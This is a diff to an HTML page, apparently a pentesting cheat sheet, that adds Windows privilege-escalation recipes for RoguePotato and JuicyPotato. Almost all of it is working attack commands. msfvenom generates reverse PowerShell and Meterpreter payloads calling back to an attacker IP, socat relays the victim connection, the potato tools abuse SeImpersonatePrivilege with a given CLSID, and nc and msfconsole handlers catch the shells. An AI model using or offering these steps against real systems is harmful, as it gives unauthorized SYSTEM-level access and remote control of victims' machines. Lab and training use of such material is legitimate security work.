@@ -79,13 +79,30 @@
                             <li>Upload both exe files from the PoC</li>
                         </ul>
                         <p> Creation of a shell that will be used later </p>
-                        <pre><code class="language-powershell">msfvenom -p cmd/Windows/reverse_powershell lhost=LOCAL_IP lport=9999 > shell.bat</code></pre>
+                        <pre><code class="language-bash">msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f raw -o shell.bat</code></pre>
                         <p> Execute that command in attacker machine to capture connection</p>
                         <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
                         <p> Execute that command in victim machine</p>
                         <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
                         <p> Execute that command in attacker machine</p>
                         <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
+
+                        <h3> Juicy Potatoes</h3>
+                        <p>Checkout the list of supported SO for the attack<a class="notion-link" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"> here</a></p>
+                        <h4> Musts </h4>
+                        <ul>
+                            <li><b>SeImpersonatePrivilege</b> must be enabled</li>
+                        </ul>
+                        <p> Creation of a shell that will be used later </p>
+                        <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
+                        <p> Transfer Juicy potatos and shell file previously created and execute. If not CLID is passed the software will take a default one</p>
+                        <pre><code class="language-cmd">JuicyPotato.exe -l 1337 -p shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</code></pre>
+                        <p>Capture the reverse connection with proper tool and interpreter</p>
+                        <pre><code class="language-bash">sudo msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.10
+set LPORT 9999</code></pre>
                     </ul>
                 </div>
 
